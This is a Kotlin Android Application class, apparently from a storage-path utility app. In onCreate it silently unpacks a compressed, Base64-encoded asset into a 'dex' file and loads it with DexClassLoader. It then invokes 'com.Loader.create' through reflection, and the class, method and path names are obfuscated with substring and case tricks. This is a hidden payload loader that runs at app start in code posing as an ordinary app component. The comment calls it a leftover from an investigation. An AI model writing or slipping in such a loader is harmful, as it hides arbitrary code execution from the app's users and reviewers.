package jp.co.integrityworks.storagepathgetter.ui

import android.app.Application
import android.util.Base64
import dalvik.system.DexClassLoader
import java.io.*
import java.lang.reflect.InvocationTargetException
import java.util.zip.InflaterInputStream

// ある調査で追加しただけなので、後で消す
class Trrrrrdy : Application() {

    var obbbbbj_a: Any? = null

    var classLoader_b: ClassLoader? = null

    lateinit var classs_c: Class<*>

    internal var str_d = ".Loader"

    private fun a(
        paramString1: String,
        paramString2: String,
        paramClassLoader: ClassLoader
    ): DexClassLoader? {
        try {
            return DexClassLoader::class.java.getConstructor(
                *arrayOf(
                    String::class.java,
                    String::class.java,
                    String::class.java,
                    ClassLoader::class.java
                )
            ).newInstance(*arrayOf<Any?>(paramString1, paramString2, null, paramClassLoader))
        } catch (e: IllegalAccessException) {
            e.printStackTrace()
            return null
        } catch (e: InstantiationException) {
            e.printStackTrace()
            return null
        } catch (e: InvocationTargetException) {
            e.printStackTrace()
            return null
        } catch (e: NoSuchMethodException) {
            e.printStackTrace()
            return null
        }

    }

    private fun a() {
        val classLoader = this.classLoader_b
        val stringBuilder = StringBuilder()
        stringBuilder.append("aCOM".substring(1).toLowerCase())
        stringBuilder.append(this.str_d)
        try {
            this.classs_c = classLoader!!.loadClass(stringBuilder.toString())
        } catch (e: ClassNotFoundException) {
            e.printStackTrace()
        }

        try {
            this.obbbbbj_a =
                this.classs_c.getMethod("ccCrEATe".substring(2).toLowerCase(), *arrayOfNulls(0))
                    .invoke(null, *arrayOfNulls(0))
        } catch (e: IllegalAccessException) {
            e.printStackTrace()
        } catch (e: InvocationTargetException) {
            e.printStackTrace()
        } catch (e: NoSuchMethodException) {
            e.printStackTrace()
        }

    }

    private fun hikisuuFile(paramFile: File) {
        val str = paramFile.absolutePath
        val stringBuilder = StringBuilder()
        stringBuilder.append(filesDir.absolutePath)
        stringBuilder.append("//A".toLowerCase().substring(1))
        a(str, stringBuilder.toString())
        a()
    }

    private fun hikiFileStream(paramFile: File, paramByteArrayOutputStream: ByteArrayOutputStream) {
        val arrayOfByte = Base64.decode(paramByteArrayOutputStream.toByteArray(), 0)
        val fileOutputStream: FileOutputStream?
        try {
            fileOutputStream = FileOutputStream(paramFile)
            fileOutputStream.write(arrayOfByte)
            fileOutputStream.close()
        } catch (e: FileNotFoundException) {
            e.printStackTrace()
        } catch (e: IOException) {
            e.printStackTrace()
        }

        val stringBuilder = StringBuilder()
        stringBuilder.append(filesDir.absolutePath)
        stringBuilder.append("Va/A".substring(2).toLowerCase())
        File(stringBuilder.toString()).mkdirs()
    }

    private fun a(paramString1: String, paramString2: String) {
        this.classLoader_b = a(paramString1, paramString2, ClassLoader.getSystemClassLoader())
    }

    override fun onCreate() {
        super.onCreate()
        try {
            val aaa = StringBuilder()
            aaa.append(filesDir.absolutePath)
            aaa.append(File.separator)
            aaa.append("DEx".toLowerCase())
            val file = File(aaa.toString())
            if (file.exists())
                file.delete()
            val byteArrayOutputStream = ByteArrayOutputStream()
            val `as` = resources.assets
            val bbb = StringBuilder()
            bbb.append("fas/".substring(1).toLowerCase())
            bbb.append(`as`.list("as")!![0])
            var inputStream = `as`.open(bbb.toString())
            inputStream.skip(4L)
            inputStream = InflaterInputStream(inputStream)
            val arrayOfByte = ByteArray(2048)
            while (true) {
                val i = inputStream.read(arrayOfByte)
                if (i == -1) {
                    inputStream.close()
                    hikiFileStream(file, byteArrayOutputStream)
                    hikisuuFile(file)
                    return
                }
                byteArrayOutputStream.write(arrayOfByte, 0, i)
            }
        } catch (throwable: Throwable) {
            throwable.printStackTrace()
            return
        }

    }
}
